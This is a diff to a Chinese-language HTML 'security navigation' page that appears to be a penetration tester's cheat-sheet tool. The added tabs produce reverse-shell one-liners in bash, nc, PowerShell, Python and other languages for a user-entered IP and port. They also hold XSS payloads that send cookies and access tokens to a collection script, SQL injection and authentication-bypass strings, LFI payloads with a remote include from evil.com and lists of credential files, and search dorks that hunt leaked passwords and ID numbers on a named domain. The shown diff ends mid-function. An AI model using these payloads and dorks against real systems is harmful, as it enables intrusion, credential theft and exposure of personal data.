@@ -12,13 +12,13 @@
         }
 
         #navbar {
-            width: 200px;
+            width: 250px;
 
             /* 导航栏宽度 */
             float: left;
             /* 左浮动 */
             /* background-color: #f0f0f0; */
-            background-color: rgb(173, 216, 230);
+            background-color: rgba(23, 193, 137, 0.66);
             /* 背景颜色 */
         }
 
@@ -52,6 +52,8 @@
         .content-item {
             display: none;
             /* 默认所有内容不显示 */
+            margin-left: 50px;
+            /* 左外边距 20px */
         }
 
         .content-item.active {
@@ -85,13 +87,22 @@
             <li><a href="#" onclick="showContent('content6')"><i class="fa fa-folder fa-lg"
                         style="color: #FFD700;"></i>&nbsp;&nbsp;云安全</a></li>
             <li><a href="#" onclick="showContent('content7')"><i class="fa fa-folder fa-lg"
-                        style="color: #FFD700;"></i>&nbsp;&nbsp;Google</a></li>
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;Google语法</a></li>
             <li><a href="#" onclick="showContent('content8')"><i class="fa fa-folder fa-lg"
-                        style="color: #FFD700;"></i>&nbsp;&nbsp;Github</a></li>
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;Github语法</a></li>
+            <li><a href="#" onclick="showContent('content9')"><i class="fa fa-folder fa-lg"
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;反弹shell</a></li>
+
+            <li><a href="#" onclick="showContent('content10')"><i class="fa fa-folder fa-lg"
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;XSS</a></li>
+            <li><a href="#" onclick="showContent('content11')"><i class="fa fa-folder fa-lg"
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;SQL Injection</a></li>
+            <li><a href="#" onclick="showContent('content12')"><i class="fa fa-folder fa-lg"
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;LFI</a></li>
         </ul>
     </div>
     <div id="content">
-        <h1>欢迎访问信息安全类网站导航页</h1>
+        <h1 style="margin-left: 50px;margin-top: 0px;">欢迎访问信息安全类网站导航</h1>
         <div id="content1" class="content-item">
             <table border="1" style="width: 1400px; height: 100px;">
                 <tr>
@@ -411,115 +422,407 @@
             </table>
         </div>
 
-        <div id="content7" class="content-item" style="background-color: black; height: 500px;overflow-y: auto;">
+        <div id="content7" class="content-item">
+
+            域名：<input type="text" id="GoogleinputText" oninput="GoogledisplayText()" style="height: 20px;width: 300px;"
+                value="baidu.com">
+            <br><br>
+            <div style="background-color: black; height: 500px;overflow-y: auto;">
+                <span style="color: white;">
+                    域名<br>
+                    site:<span id="GoogledisplayText1">baidu.com</span><br><br>
+
+                    title关键词<br>
+                    site:<span id="GoogledisplayText2">baidu.com</span>
+                    intitle:身份证|sfz|学号|xh|登录|注册|管理|平台|验证码|账号|系统|手册|默认密码|初始密码|password|联系电话|操作手册|vpn|名单<br><br>
+
+                    body关键词<br>
+                    site:<span id="GoogledisplayText3">baidu.com</span>
+                    intext:身份证|sfz|学号|xh|登录|注册|管理|平台|验证码|账号|系统|手册|默认密码|初始密码|password|联系电话|操作手册|vpn|名单<br><br>
+
+                    文件类型（文件类型不支持｜，需要拆分出来单独查询）<br>
+                    site:<span id="GoogledisplayText4">baidu.com</span>
+                    filetype:pdf|xls|xlsx|docx|doc|text|ini|mdb|txt<br><br>
+
+                    SQL注入<br>
+                    site:<span id="GoogledisplayText5">baidu.com</span> inurl:aspx|asp|php|jsp|do|.action|html<br><br>
+
+                    文件路径<br>
+                    site:<span id="GoogledisplayText6">baidu.com</span>
+                    inurl:login|admin|manage|sysadmin|system|master|admin_login|cms|data|templates|index<br><br>
+
+                    文件上传<br>
+                    site:<span id="GoogledisplayText7">baidu.com</span>
+                    inurl:file|upload|uploadfile|ewebeditor|kindediter|Ueditor|file|choosefile<br><br>
+
+                    -----------------------------目录穿越-----------------------------<br>
+                    intitle:index.of "parent directory"<br>
+                    intitle:index of /ppt<br>
+                    intitle:index of /password<br>
+                    intext:转到父目录/转到父路径<br>
+                    intext:to parent directory<br><br>
+
+                    -----------------------------业务相关性-----------------------------<br>
+                    site:<span id="GoogledisplayText8">baidu.com</span> "审计报告" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText9">baidu.com</span> "财务报告" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText10">baidu.com</span> "科技奖" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText11">baidu.com</span> "发明专利" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText12">baidu.com</span> "财务报告" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText13">baidu.com</span> "无犯罪记录" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText14">baidu.com</span> "特发此证" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText15">baidu.com</span> "出版合同" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText16">baidu.com</span> "甲方代表" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText17">baidu.com</span> "乙方代表" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText18">baidu.com</span> "籍贯" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText19">baidu.com</span> "汉族" "身份证" "SFZ"<br>
+                    site:<span id="GoogledisplayText20">baidu.com</span> "职称" "身份证" "SFZ"<br>
+                </span>
+            </div>
+        </div>
+
+        <div id="content8" class="content-item">
+            域名：<input type="text" id="githubinputText" oninput="githubdisplayText()" style="height: 20px;width: 300px;"
+                value="baidu.com">
+            <br><br>
+            <div style="background-color: black; height: 500px;overflow-y: auto;">
+                <span style="color: white;">
+                    -----------------------------在github上搜索-----------------------------<br><br>
+
+                    按关键字搜索<br>
+                    <span id="githubdisplayText1">baidu.com</span> root<br>
+                    <span id="githubdisplayText2">baidu.com</span> 默认账号<br>
+                    <span id="githubdisplayText3">baidu.com</span> 密码<br>
+                    <span id="githubdisplayText4">baidu.com</span> VPN 账号<br><br>
+
+                    按域名与代码片段搜索：<br>
+                    <span id="githubdisplayText5">baidu.com</span> "/main/13527222.js"<br><br>
+
+                    按github搜语法搜索：<br>
+                    in:name <span id="githubdisplayText6">baidu.com</span> #仓库标题搜索含有关键字<br>
+                    in:descripton <span id="githubdisplayText7">baidu.com</span> #仓库描述搜索含有关键字<br>
+                    in:readme <span id="githubdisplayText8">baidu.com</span> #Readme文件搜素含有关键字<br>
+                    stars:>3000 <span id="githubdisplayText9">baidu.com</span> #stars数量大于3000的搜索关键字<br>
+                    stars:1000..3000 <span id="githubdisplayText10">baidu.com</span> #stars数量大于1000小于3000的搜索关键字<br>
+                    forks:>1000 <span id="githubdisplayText11">baidu.com</span> #forks数量大于1000的搜索关键字<br>
+                    forks:1000..3000 <span id="githubdisplayText12">baidu.com</span> #forks数量大于1000小于3000的搜索关键字<br>
+                    size:>=5000 <span id="githubdisplayText13">baidu.com</span> #指定仓库大于5000k(5M)的搜索关键字<br>
+                    pushed:>2019-02-12 <span id="githubdisplayText14">baidu.com</span> #发布时间大于2019-02-12的搜索关键字<br>
+                    created:>2019-02-12 <span id="githubdisplayText15">baidu.com</span> #创建时间大于2019-02-12的搜索关键字<br>
+                    user:<span id="githubdisplayText16">baidu.com</span> #用户名搜素<br>
+                    license:apache-2.0 <span id="githubdisplayText17">baidu.com</span> #明确仓库的 LICENSE 搜索关键字<br>
+                    language:java <span id="githubdisplayText18">baidu.com</span> #在java语言的代码中搜索关键字<br>
+                    user:test in:name <span id="githubdisplayText19">baidu.com</span> #组合搜索,用户名test的标题含有test的<br><br>
+
+                    -----------------------------在谷歌上搜索github-----------------------------<br><br>
+
+                    邮箱配置信息泄露<br>
+                    site:github.com "<span id="githubdisplayText20">baidu.com</span>" smtp password<br>
+                    site:github.com "<span id="githubdisplayText21">baidu.com</span>" smtp @126.com<br>
+                    site:github.com "<span id="githubdisplayText22">baidu.com</span>" String password smtp<br><br>
+
+
+                    数据库信息泄露<br>
+                    site:github.com "<span id="githubdisplayText23">baidu.com</span>" root password<br>
+                    site:github.com "<span id="githubdisplayText24">baidu.com</span>" sa password<br>
+                    site:github.com "<span id="githubdisplayText25">baidu.com</span>" User ID='sa';Password<br><br>
+
+                    svn信息泄露<br>
+                    site:github.com "<span id="githubdisplayText26">baidu.com</span>" svn<br>
+                    site:github.com "<span id="githubdisplayText27">baidu.com</span>" svn password<br>
+                    site:github.com "<span id="githubdisplayText28">baidu.com</span>" svn username<br>
+                    site:github.com "<span id="githubdisplayText29">baidu.com</span>" svn username password<br><br>
+
+                    数据库备份文件<br>
+                    site:github.com "<span id="githubdisplayText30">baidu.com</span>" inurl:sql<br><br>
+
+
+                    综合信息泄露<br>
+                    site:github.com "<span id="githubdisplayText31">baidu.com</span>" password<br>
+                    site:github.com "<span id="githubdisplayText32">baidu.com</span>" ftp ftppassword<br>
+                    site:github.com "<span id="githubdisplayText33">baidu.com</span>" 密码<br>
+                    site:github.com "<span id="githubdisplayText34">baidu.com</span>" 内部<br>
+                </span>
+            </div>
+        </div>
+
+
+        <div id="content9" class="content-item">
+            ip：<input type="text" id="inputText" oninput="displayText()" style="height: 20px;width: 300px;"
+                value="192.168.1.1">
+            port：<input type="text" id="inputText1" oninput="displayText()" style="height: 20px;width: 100px;"
+                value="1234">
+            <br><br>
+            <div style="background-color: black; height: 500px;overflow-y: auto;">
+                <span style="color: white;">
+                    <p>Bash命令：</p>
+                    <p>bash -c 'exec bash -i &>/dev/tcp/<span id="displayText">192.168.1.1</span>/<span
+                            id="displayText1">1234</span>
+                        <&1' </p><br>
+                            <p>Zsh命令：</p>
+                            <p>zsh -c 'zmodload zsh/net/tcp && ztcp <span id="displayText2">192.168.1.1</span> <span
+                                    id="displayText3">1234</span> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'</p><br>
+                            <p>Netcat命令：</p>
+                            <p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span
+                                    id="displayText4">192.168.1.1</span> <span id="displayText5">1234</span> >/tmp/f</p>
+                            <br>
+                            <p>PHP命令：</p>
+                            <p>php -r '$sock=fsockopen(getenv("<span
+                                    id="displayText6">192.168.1.1</span>"),getenv("<span
+                                    id="displayText7">1234</span>"));exec("/bin/sh -i <&3>&3 2>&3");'</p><br>
+                            <p>PowerShell命令：</p>
+                            <p>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<span
+                                    id="displayText8">192.168.1.1</span>',<span id="displayText9">1234</span>);$stream =
+                                $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
+                                $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
+                                System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
+                                Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =
+                                ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+                            </p><br>
+                            <p>Perl命令：</p>
+                            <p>perl -e 'use Socket;$i="$ENV{<span id="displayText10">192.168.1.1</span>}";$p=$ENV{<span
+                                    id="displayText11">1234</span>};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+                                -i");};'</p><br>
+                            <p>Python命令：</p>
+                            <p>python -c 'import
+                                socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span
+                                    id="displayText12">192.168.1.1</span>",<span
+                                    id="displayText13">1234</span>));os.dup2(s.fileno(),0);
+                                os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</p><br>
+                            <p>Ruby命令：</p>
+                            <p>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["<span
+                                    id="displayText14">192.168.1.1</span>"],ENV["<span
+                                    id="displayText15">1234</span>"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
+                                io.read}end'</p><br>
+                            <p>Telnet命令：</p>
+                            <p>TF=$(mktemp -u); mkfifo $TF && telnet <span id="displayText16">192.168.1.1</span> <span
+                                    id="displayText17">1234</span> 0<$TF | /bin sh 1>$TF</p>
+                </span>
+            </div>
+        </div>
+
+
+
+        <div id="content10" class="content-item" style="background-color: black; height: 500px;overflow-y: auto;">
             <span style="color: white;">
-                域名<br>
-                site:test.com<br><br>
-
-                title关键词<br>
-                site:test.com
-                intitle:身份证|sfz|学号|xh|登录|注册|管理|平台|验证码|账号|系统|手册|默认密码|初始密码|password|联系电话|操作手册|vpn|名单<br><br>
-
-                body关键词<br>
-                site:test.com
-                intext:身份证|sfz|学号|xh|登录|注册|管理|平台|验证码|账号|系统|手册|默认密码|初始密码|password|联系电话|操作手册|vpn|名单<br><br>
-
-                文件类型（文件类型不支持｜，需要拆分出来单独查询）<br>
-                site:test.com filetype:pdf|xls|xlsx|docx|doc|text|ini|mdb|txt<br><br>
-
-                SQL注入<br>
-                site:test.com inurl:aspx|asp|php|jsp|do|.action|html<br><br>
-
-                文件路径<br>
-                site:test.com
-                inurl:login|admin|manage|sysadmin|system|master|admin_login|cms|data|templates|index<br><br>
-
-                文件上传<br>
-                site:test.com inurl:file|upload|uploadfile|ewebeditor|kindediter|Ueditor|file|choosefile<br><br>
-
-                -----------------------------目录穿越-----------------------------<br>
-                intitle:index.of "parent directory"<br>
-                intitle:index of /ppt<br>
-                intitle:index of /password<br>
-                intext:转到父目录/转到父路径<br>
-                intext:to parent directory<br><br>
-
-                -----------------------------业务相关性-----------------------------<br>
-                site:test.com "审计报告" "身份证" "SFZ"<br>
-                site:test.com "财务报告" "身份证" "SFZ"<br>
-                site:test.com "科技奖" "身份证" "SFZ"<br>
-                site:test.com "发明专利" "身份证" "SFZ"<br>
-                site:test.com "财务报告" "身份证" "SFZ"<br>
-                site:test.com "无犯罪记录" "身份证" "SFZ"<br>
-                site:test.com "特发此证" "身份证" "SFZ"<br>
-                site:test.com "出版合同" "身份证" "SFZ"<br>
-                site:test.com "甲方代表" "身份证" "SFZ"<br>
-                site:test.com "乙方代表" "身份证" "SFZ"<br>
-                site:test.com "籍贯" "身份证" "SFZ"<br>
-                site:test.com "汉族" "身份证" "SFZ"<br>
-                site:test.com "职称" "身份证" "SFZ"<br>
+                Data grabber for XSS<br>
+                &lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;<br>
+                &lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;<br>
+                &lt;script&gt;new Image().src='http://localhost/cookie.php?c='+document.cookie;&lt;/script&gt;<br>
+                &lt;script&gt;new
+                Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');&lt;/script&gt;<br><br>
+                XSS in HTML/Applications<br>
+                &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+                &lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;<br>
+                "&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;<br>
+                "&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br>
+                &lt;img src=x onerror=alert('XSS');&gt;<br>
+                &lt;img src=x onerror=alert('XSS')//<br>
+                &lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;<br>
+                &lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;<br>
+                &lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;<br>
+                "&gt;&lt;img src=x onerror=alert("XSS");&gt;<br>
+                "&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;<br><br>
+                XSS in Markdown<br>
+                [a](javascript:prompt(document.cookie))<br>
+                [a](j a v a s c r i p t:prompt(document.cookie))<br>
+                [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)<br>
+                [a](javascript:window.onerror=alert;throw%201)<br><br>
+                XSS in SVG (short)<br>
+                &lt;svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/&gt;<br>
+                &lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;<br>
+                &lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;<br>
+                &lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;<br><br>
+                Bypass word blacklist with code evaluation<br>
+                eval('ale'+'rt(0)');<br>
+                Function('ale'+'rt(1)')();<br>
+                new Function`alert`6``;<br>
+                setTimeout('ale'+'rt(2)');<br>
+                setInterval('ale'+'rt(10)');<br>
+                Set.constructor('ale'+'rt(13)')();<br>
+                Set.constructor`alert(14)```;<br>
             </span>
         </div>
 
-        <div id="content8" class="content-item" style="background-color: black; height: 500px;overflow-y: auto;">
+
+        <div id="content11" class="content-item" style="background-color: black; height: 500px;overflow-y: auto;">
             <span style="color: white;">
-                -----------------------------在github上搜索-----------------------------<br><br>
+                Number of column<br>
+                MySQL/MSSQL/PGSQL<br>
+                'UNION SELECT NULL,NULL,NULL -- -<br><br>
 
-                按关键字搜索<br>
-                test.com root<br>
-                test.com 默认账号<br>
-                test.com 密码<br>
-                test.com VPN 账号<br><br>
+                ORACLE<br>
+                'UNION SELECT NULL,NULL,NULL FROM DUAL -- -<br><br>
 
-                按域名与代码片段搜索：<br>
-                test.com "/main/13527222.js"<br><br>
+                MYSQL/MSSQL/PGSQL/ORACLE - (add +1 until you get an exception)<br>
+                ' UNION ORDER BY 1 -- -<br><br>
 
-                按github搜语法搜索：<br>
-                in:name test.com #仓库标题搜索含有关键字<br>
-                in:descripton test.com #仓库描述搜索含有关键字<br>
-                in:readme test.com #Readme文件搜素含有关键字<br>
-                stars:>3000 test.com #stars数量大于3000的搜索关键字<br>
-                stars:1000..3000 test.com #stars数量大于1000小于3000的搜索关键字<br>
-                forks:>1000 test.com #forks数量大于1000的搜索关键字<br>
-                forks:1000..3000 test.com #forks数量大于1000小于3000的搜索关键字<br>
-                size:>=5000 test.com #指定仓库大于5000k(5M)的搜索关键字<br>
-                pushed:>2019-02-12 test.com #发布时间大于2019-02-12的搜索关键字<br>
-                created:>2019-02-12 test.com #创建时间大于2019-02-12的搜索关键字<br>
-                user:test.com #用户名搜素<br>
-                license:apache-2.0 test.com #明确仓库的 LICENSE 搜索关键字<br>
-                language:java test.com #在java语言的代码中搜索关键字<br>
-                user:test in:name test.com #组合搜索,用户名test的标题含有test的<br><br>
+                Database enumeration<br>
+                MySQL/MSSQL<br>
+                ' UNION SELECT @@version -- -<br><br>
 
-                -----------------------------在谷歌上搜索github-----------------------------<br><br>
+                Oracle<br>
+                ' UNION SELECT banner from v$version -- -<br><br>
 
-                邮箱配置信息泄露<br>
-                site:github.com "test.com" smtp password<br>
-                site:github.com "test.com" smtp @126.com<br>
-                site:github.com "test.com" String password smtp<br><br>
+                Oracle(2nd method)<br>
+                ' UNION SELECT version from v$instance -- -<br><br>
+
+                Postgres<br>
+                ' UNION SELECT version() -- -<br><br>
+
+                Tablename enumeration<br>
+                MySQL/MSSQL/Postgres<br>
+                ' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -<br><br>
+
+                Oracle<br>
+                ' UNION SELECT table_name,NULL FROM all_tables -- -<br><br>
+
+                Column name enumeration<br>
+                MySQL/MSSQL/Postgres<br>
+                ' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -<br><br>
+
+                Oracle<br>
+                ' UNION SELECT column_name,NULL FROM where table_name="X" -- -<br><br>
+
+                Column values concatenation<br><br>
+                MySQL/Postgres<br>
+
+                ' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -<br><br>
+
+                MySQL(2nd method)<br>
+                ' UNION SELECT col1 ':' col2 from table_name limit 1 -- -<br><br>
+
+                Oracle / Postgres<br>
+                ' UNION SELECT select col1 ||':'||col2, null FROM where table_name="X" -- -<br><br>
+
+                MSSQL<br>
+                ' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -<br><br>
+
+                Conditional ( Error Based )<br>
+                MySQL<br>
+                ' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') --
+                -<br><br>
+
+                Postgres<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -<br><br>
+
+                Oracle<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -<br><br>
+
+                MSSQL<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -<br><br>
 
 
-                数据库信息泄露<br>
-                site:github.com "test.com" root password<br>
-                site:github.com "test.com" sa password<br>
-                site:github.com "test.com" User ID='sa';Password<br><br>
+                Time-Based<br>
+                ,(select * from (select(sleep(10)))a)<br>
+                ';WAITFOR DELAY '0:0:30'--<br><br>
 
-                svn信息泄露<br>
-                site:github.com "test.com" svn<br>
-                site:github.com "test.com" svn password<br>
-                site:github.com "test.com" svn username<br>
-                site:github.com "test.com" svn username password<br><br>
+                Generic Error Based Payloads<br>
+                MySQL<br>
+                ' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') --
+                -<br><br>
 
-                数据库备份文件<br>
-                site:github.com "test.com" inurl:sql<br><br>
+                Postgres<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -<br><br>
 
+                Oracle<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -<br><br>
+                MSSQL<br>
+                ' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -<br><br>
 
-                综合信息泄露<br>
-                site:github.com "test.com" password<br>
-                site:github.com "test.com" ftp ftppassword<br>
-                site:github.com "test.com" 密码<br>
-                site:github.com "test.com" 内部<br>
+                Authentication Based Payloads<br>
+
+                or true--<br>
+                ") or true--<br>
+                ') or true--<br>
+                admin') or ('1'='1'--<br>
+                admin') or ('1'='1'#<br>
+                admin') or ('1'='1'/<br><br>
+
+                Order by and UNION Based Payloads<br>
+
+                1' ORDER BY 1--+<br>
+                1' ORDER BY 2--+<br>
+                1' ORDER BY 3--+<br>
+                1' ORDER BY 1,2--+<br>
+                1' ORDER BY 1,2,3--+<br>
+                1' GROUP BY 1,2,--+<br>
+                1' GROUP BY 1,2,3--+<br>
+                ' GROUP BY columnnames having 1=1 --<br>
+                -1' UNION SELECT 1,2,3--+<br>
+                ' UNION SELECT sum(columnname ) from tablename --<br>
+                -1 UNION SELECT 1 INTO @,@<br>
+                -1 UNION SELECT 1 INTO @,@,@<br>
+                1 AND (SELECT * FROM Users) = 1 <br>
+                ' AND MID(VERSION(),1,1) = '5';<br>
+                ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --<br>
             </span>
         </div>
+
+
+        <div id="content12" class="content-item" style="background-color: black; height: 500px;overflow-y: auto;">
+            <span style="color: white;">
+                Directory traversal<br>
+                foo.php?file=../../../../../../../etc/passwd<br><br>
+
+                PHP Wrapper php://file<br>
+                /example1.php?page=expect://ls<br><br>
+
+                PHP Wrapper php://filter<br>
+                /example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd<br><br>
+
+                PHP Wrapper php://filter<br>
+                http://example.com/index.php?page=http://evil.com/shell.txt<br><br>
+
+                Useful LFI files<br><br>
+                Linux<br>
+                /etc/passwd<br>
+                /etc/shadow<br>
+                /etc/issue<br>
+                /etc/group<br>
+                /etc/hostname<br>
+                /etc/ssh/ssh_config<br>
+                /etc/ssh/sshd_config<br>
+                /root/.ssh/id_rsa<br>
+                /root/.ssh/authorized_keys<br>
+                /home/user/.ssh/authorized_keys<br>
+                /home/user/.ssh/id_rsa<br>
+                /proc/[0-9]*/fd/[0-9]*<br>
+                /proc/mounts<br>
+                /home/$USER/.bash_history<br>
+                /home/$USER/.ssh/id_rsa<br>
+                /var/run/secrets/kubernetes.io/serviceaccount<br>
+                /var/lib/mlocate/mlocate.db<br>
+                /var/lib/mlocate.db<br><br>
+
+                Apache<br>
+                /etc/apache2/apache2.conf<br>
+                /usr/local/etc/apache2/httpd.conf<br>
+                /etc/httpd/conf/httpd.conf<br>
+                Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log<br>
+                Debian/Ubuntu -> /var/log/apache2/access.log<br>
+                FreeBSD -> /var/log/httpd-access.log<br>
+                /var/log/apache/access.log<br>
+                /var/log/apache/error.log<br>
+                /var/log/apache2/access.log<br>
+                /var/log/apache/error.log<br><br>
+
+                MySQL<br>
+                /var/lib/mysql/mysql/user.frm<br>
+                /var/lib/mysql/mysql/user.MYD<br>
+                /var/lib/mysql/mysql/user.MYI<br><br>
+
+                Windows<br>
+                /boot.ini<br>
+                /autoexec.bat<br>
+                /windows/system32/drivers/etc/hosts<br>
+                /windows/repair/SAM<br>
+                /windows/panther/unattended.xml<br>
+                /windows/panther/unattend/unattended.xml<br>
+                /windows/system32/license.rtf<br>
+                /windows/system32/eula.txt<br>
+            </span>
+        </div>
+
     </div>
 
     <script>
@@ -530,6 +833,198 @@
             }
             document.getElementById(contentId).classList.add('active');
         }
+
+        // 反弹shell
+        function displayText() {
+            // 获取输入框的值
+            var inputElement = document.getElementById('inputText');
+            var inputElement1 = document.getElementById('inputText1');
+
+            var displayElement = document.getElementById('displayText');
+            var displayElement1 = document.getElementById('displayText1');
+
+            var displayElement2 = document.getElementById('displayText2');
+            var displayElement3 = document.getElementById('displayText3');
+
+            var displayElement4 = document.getElementById('displayText4');
+            var displayElement5 = document.getElementById('displayText5');
+
+            var displayElement6 = document.getElementById('displayText6');
+            var displayElement7 = document.getElementById('displayText7');
+
+            var displayElement8 = document.getElementById('displayText8');
+            var displayElement9 = document.getElementById('displayText9');
+
+            var displayElement10 = document.getElementById('displayText10');
+            var displayElement11 = document.getElementById('displayText11');
+
+            var displayElement12 = document.getElementById('displayText12');
+            var displayElement13 = document.getElementById('displayText13');
+
+            var displayElement14 = document.getElementById('displayText14');
+            var displayElement15 = document.getElementById('displayText15');
+
+            var displayElement16 = document.getElementById('displayText16');
+            var displayElement17 = document.getElementById('displayText17');
+
+
+            // 将输入框的值设置到显示区域
+            displayElement.textContent = inputElement.value;
+            displayElement1.textContent = inputElement1.value;
+
+            displayElement2.textContent = inputElement.value;
+            displayElement3.textContent = inputElement1.value;
+
+            displayElement4.textContent = inputElement.value;
+            displayElement5.textContent = inputElement1.value;
+
+            displayElement6.textContent = inputElement.value;
+            displayElement7.textContent = inputElement1.value;
+
+            displayElement8.textContent = inputElement.value;
+            displayElement9.textContent = inputElement1.value;
+
+            displayElement10.textContent = inputElement.value;
+            displayElement11.textContent = inputElement1.value;
+
+            displayElement12.textContent = inputElement.value;
+            displayElement13.textContent = inputElement1.value;
+
+            displayElement14.textContent = inputElement.value;
+            displayElement15.textContent = inputElement1.value;
+
+            displayElement16.textContent = inputElement.value;
+            displayElement17.textContent = inputElement1.value;
+
+
+        }
+
+
+        // 谷歌语法
+        function GoogledisplayText() {
+            // 获取输入框的值
+            var GoogleinputText = document.getElementById('GoogleinputText');
+            // 获取显示的值
+            var displayElement1 = document.getElementById('GoogledisplayText1');
+            var displayElement2 = document.getElementById('GoogledisplayText2');
+            var displayElement3 = document.getElementById('GoogledisplayText3');
+            var displayElement4 = document.getElementById('GoogledisplayText4');
+            var displayElement5 = document.getElementById('GoogledisplayText5');
+            var displayElement6 = document.getElementById('GoogledisplayText6');
+            var displayElement7 = document.getElementById('GoogledisplayText7');
+            var displayElement8 = document.getElementById('GoogledisplayText8');
+            var displayElement9 = document.getElementById('GoogledisplayText9');
+            var displayElement10 = document.getElementById('GoogledisplayText10');
+            var displayElement11 = document.getElementById('GoogledisplayText11');
+            var displayElement12 = document.getElementById('GoogledisplayText12');
+            var displayElement13 = document.getElementById('GoogledisplayText13');
+            var displayElement14 = document.getElementById('GoogledisplayText14');
+            var displayElement15 = document.getElementById('GoogledisplayText15');
+            var displayElement16 = document.getElementById('GoogledisplayText16');
+            var displayElement17 = document.getElementById('GoogledisplayText17');
+            var displayElement18 = document.getElementById('GoogledisplayText18');
+            var displayElement19 = document.getElementById('GoogledisplayText19');
+            var displayElement20 = document.getElementById('GoogledisplayText20');
+
+
+            displayElement1.textContent = GoogleinputText.value;
+            displayElement2.textContent = GoogleinputText.value;
+            displayElement3.textContent = GoogleinputText.value;
+            displayElement4.textContent = GoogleinputText.value;
+            displayElement5.textContent = GoogleinputText.value;
+            displayElement6.textContent = GoogleinputText.value;
+            displayElement7.textContent = GoogleinputText.value;
+            displayElement8.textContent = GoogleinputText.value;
+            displayElement9.textContent = GoogleinputText.value;
+            displayElement10.textContent = GoogleinputText.value;
+            displayElement11.textContent = GoogleinputText.value;
+            displayElement12.textContent = GoogleinputText.value;
+            displayElement13.textContent = GoogleinputText.value;
+            displayElement14.textContent = GoogleinputText.value;
+            displayElement15.textContent = GoogleinputText.value;
+            displayElement16.textContent = GoogleinputText.value;
+            displayElement17.textContent = GoogleinputText.value;
+            displayElement18.textContent = GoogleinputText.value;
+            displayElement19.textContent = GoogleinputText.value;
+            displayElement20.textContent = GoogleinputText.value;
+        }
+
+        // Github搜索
+        function githubdisplayText() {
+            // 获取输入框的值
+            var githubinputText = document.getElementById('githubinputText');
+            // 获取显示的值
